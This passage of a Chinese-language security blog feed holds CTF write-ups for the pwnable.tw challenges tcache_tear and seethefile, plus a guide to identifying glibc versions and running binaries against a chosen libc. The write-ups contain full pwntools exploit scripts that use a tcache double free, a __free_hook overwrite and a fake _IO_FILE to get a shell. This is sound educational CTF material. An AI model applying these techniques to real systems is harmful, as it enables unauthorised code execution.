class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;info&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./tcache_tear&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># create fake chunk</span></span><br><span class="line">    name_addr = <span class="number">0x602060</span></span><br><span class="line">    init_(p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line">    malloc_(<span class="number">0x40</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line">    free_()</span><br><span class="line">    malloc_(<span class="number">0x40</span>, p64(name_addr+<span class="number">0x420</span>))</span><br><span class="line">    malloc_(<span class="number">0x40</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    malloc_(<span class="number">0x40</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free fake chunk</span></span><br><span class="line">    malloc_(<span class="number">0x20</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line">    free_()</span><br><span class="line">    malloc_(<span class="number">0x20</span>, p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">    malloc_(<span class="number">0x20</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    malloc_(<span class="number">0x20</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *0x200C11&quot;)</span></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    ret = info_()</span><br><span class="line">    libc_base = u64(ret[<span class="number">16</span>:<span class="number">24</span>]) - <span class="number">0x3EBCA0</span></span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    malloc_(<span class="number">0x30</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line">    free_()</span><br><span class="line">    malloc_(<span class="number">0x30</span>, p64(free_hook))</span><br><span class="line">    malloc_(<span class="number">0x30</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    malloc_(<span class="number">0x30</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger</span></span><br><span class="line">    malloc_(<span class="number">0x50</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    free_()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8047000)</span><br><span class="line"></span><br><span class="line">libc_version: Ubuntu GLIBC 2.23-0ubuntu5</span><br></pre></td></tr></table></figure><p>openfile: 输入路径，打开文件，进行了简单的路径过滤</p><p>readfile: 从文件中读取0x18f</p><p>writefile: 输出读取的内容。对文件内容进行了过滤,存在某些字符就不输出</p><p>exit: 读入姓名，这里存在任意长度溢出，可以发现可覆盖fp</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200819184742646.png" alt="image-20200819184742646"></p><h2 id="总体思路-1"><a href="#总体思路-1" class="headerlink" title="总体思路"></a>总体思路</h2><p>利用/proc/self/maps泄露libc base。使用name的溢出构造fake <code>_IO_FILE</code>，将<code>__finish</code>改成system_addr，劫持fclose控制流。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* libio/iofclose.c */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)      <span class="comment">// 去掉_IO_IS_FILEBUF flag</span></span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);                        <span class="comment">// 需要_IO_USER_LOCK 0x8000 flag，</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)      <span class="comment">// 否则会在这里发生段错误</span></span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);                              <span class="comment">// 执行vtable中的__finish</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment"> the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/seethefile/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./origin_seethefile&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># locallibc = &quot;/home/liu/src/how2heap/glibc_versions/2.23/i686_tcache/lib/libc-2.23.so&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span>(<span class="params">filename</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;What do you want to see :&quot;</span>)</span><br><span class="line">    io.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">name</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Leave your name :&quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># leak libc base</span></span><br><span class="line">    name_addr = <span class="number">0x804B260</span></span><br><span class="line">    open(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">    read()</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    read()</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;0 \n&quot;</span>)</span><br><span class="line">    libc_base = int(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create fake IO_FILE</span></span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span> + p32(name_addr+<span class="number">0x30</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0xc</span></span><br><span class="line">    payload += <span class="string">b&quot;\xff\xdf\xff\xff;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x94</span>, <span class="string">b&quot;\x00&quot;</span>) + p32(name_addr+<span class="number">0x30</span>+<span class="number">0x98</span>)</span><br><span class="line">    payload += p32(system_addr)*<span class="number">0x20</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># payload = b&quot;\x11\x80\x11\x11;sh&quot;.ljust(8, b&quot;\x00&quot;) + p32(system_addr)*6 + p32(name_addr) + p32(0)*28 + p32(name_addr)</span></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b fclose&quot;)</span></span><br><span class="line">    exit(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    io.sendline(<span class="string">&quot;cd /home/seethefile/&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><p>这个libc无论是使用自编译的ld(release/2.23/master)，还是ubuntu16.04当前最新的ld，均无法成功运行seethefile。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;tcache-tear&quot;&gt;&lt;a href=&quot;#tcache-tear&quot; class=&quot;headerlink&quot; title=&quot;tcache_tear&quot;&gt;&lt;/a&gt;tcache_tear&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      No PIE (0x400000)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libc_version: Ubuntu GLIBC 2.27-3ubuntu1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;程序开始在bss段上读入了一个0x20的名字&lt;/p&gt;
&lt;p&gt;malloc: 输入指定size，分配，指针ptr同样存储在bss，读入size-16的字符，这里字符个数可以溢出&lt;/p&gt;
&lt;p&gt;free: 释放ptr空间，指针悬空，可以double free，程序使用了tcache，且在这个版本释放没有任何的检查&lt;/p&gt;
&lt;p&gt;info: 打印姓名&lt;/p&gt;
&lt;h2 id=&quot;总体思路&quot;&gt;&lt;a href=&quot;#总体思路&quot; class=&quot;headerlink&quot; title=&quot;总体思路&quot;&gt;&lt;/a&gt;总体思路&lt;/h2&gt;&lt;p&gt;利用tcache double free，可以对任意地址进行改写。在name处伪造一个chunk释放到unsorted bin，进行libc base的泄露。将&lt;code&gt;__free_hook&lt;/code&gt;改写为system地址。&lt;/p&gt;
&lt;p&gt;伪造chunk注意绕过free的所有检查。伪造完成的结构如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  0x421   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|          |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  0x21    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|  0x21    |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+----------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;tcache默认最多有64个，第1个是0x20大小，递推第64个也就是0x410。所以将name处伪造为0x420大小。第一个chunk的&lt;code&gt;chunk-&amp;gt;size=0x420|pre_in_use&lt;/code&gt;，避免backward consolidate，第三个chunk的&lt;code&gt;chunk-&amp;gt;size=0x20|pre_in_use&lt;/code&gt;，避免forward consolidate。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>确定glibc版本,以指定glibc运行程序</title>
    <link href="http://hhdx.xyz/2020/08/08/%E4%BB%A5%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/"/>
    <id>http://hhdx.xyz/2020/08/08/%E4%BB%A5%E6%8C%87%E5%AE%9Alibc%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/</id>
    <published>2020-08-08T01:08:15.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CTF题目中经常会给出libc的文件，首先需要做的就是确定libc的版本，对程序进行针对性的攻击。最直接的确定方法就是直接运行该libc<code>./libc.so.6</code>，但通常由于本机ld版本与libc版本不匹配，发生段错误。</p><p>确定完大版本号还不够，因为就算是同一版本的libc也会有较大的变动。比方说，与最开始的2.29版本相比，gnu libc库的release/2.29/master分支的<code>tcache_perthread_struct-&gt;counts</code>的变量类型都变了；<code>__libc_malloc</code>中取用tcache的判定，也由判断指针是否为空变成了判断counts是否大于0。这些细节很大程度上影响了exploit的书写。</p><p>下面以pwnable.tw re-alloc的<a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc/libc.so.6">libc</a>为例，写一写我的经验。</p><a id="more"></a><h2 id="确定版本号"><a href="#确定版本号" class="headerlink" title="确定版本号"></a>确定版本号</h2><h3 id="有libc"><a href="#有libc" class="headerlink" title="有libc"></a>有libc</h3><p>从libc的字符串确定大版本<code>strings libc.so.6 | grep libc-</code></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200808100344272.png" alt="image-20200808100344272"></p><p>自编译对应版本的glibc使用其ld程序，可以使用how2heap的<a href="https://github.com/shellphish/how2heap/blob/master/glibc_build.sh">编译脚本</a>，<a href="https://hhdx.xyz/2020/06/28/How2heap-fastbin-dup-consolidate-Hitcon2016-SleepyHolder/#%E5%89%8D%E7%BD%AE">使用方法</a>。拷贝ld到libc.so.6的目录。</p><p>使用ld运行libc.so.6得到小版本号，<code>./ld-2.29.so --library-path . ./libc.so.6</code></p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200808100856947.png" alt="image-20200808100856947"></p><p>最后，google搜索<code>GLIBC 2.29-0ubuntu2 source</code>就能够得到该libc版本的源码。</p><p>也可以搜索<code>libc6-dbg GLIBC 2.29-0ubuntu</code>获取调试符号信息。</p><h3 id="无libc"><a href="#无libc" class="headerlink" title="无libc"></a>无libc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -s --section .comment /path/to/binary</span></span><br></pre></td></tr></table></figure><p>通过编译器版本注释推测libc版本。</p><h2 id="以指定libc运行程序"><a href="#以指定libc运行程序" class="headerlink" title="以指定libc运行程序"></a>以指定libc运行程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> patchelf --set-interpreter ./ld-2.29.so re-alloc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> patchelf --set-rpath <span class="string">&#x27;$ORIGIN/&#x27;</span> re-alloc</span></span><br></pre></td></tr></table></figure><p>patchelf可以通过apt直接安装。</p><p>修改程序ld路径和library查找路径。</p><p><code>$ORIGIN</code>是个特殊的变量，ld会将它替换成程序当前目录</p><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>如果动态链接发生错误，可以使用<code>LD_DEBUG</code>环境变量打印动态链接日志。</p><p>其变量有<code>files</code>, <code>bindings</code>, <code>libs</code>, <code>versions</code>, <code>reloc</code>, <code>symbols</code>,  <code>statistics</code>, <code>all</code>, <code>help</code></p><p>例如：<code>LD_DEBUG=all ./re-alloc</code></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li><a href="http://shibing.github.io/2016/08/20/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%8Erpath/">http://shibing.github.io/2016/08/20/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%B8%8Erpath/</a></li></ol>]]></content>
    
    
